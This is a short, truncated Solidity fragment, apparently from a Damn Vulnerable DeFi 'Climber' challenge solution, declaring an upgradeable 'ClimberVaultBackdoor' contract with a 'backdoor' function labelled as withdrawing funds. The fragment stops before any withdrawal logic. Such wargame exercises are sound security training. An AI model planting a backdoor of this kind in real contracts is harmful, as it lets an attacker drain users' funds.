 ...
 */
contract ClimberVaultBackdoor is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    ...
    // backdoor function to withdrawn funds
    function backdoor(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
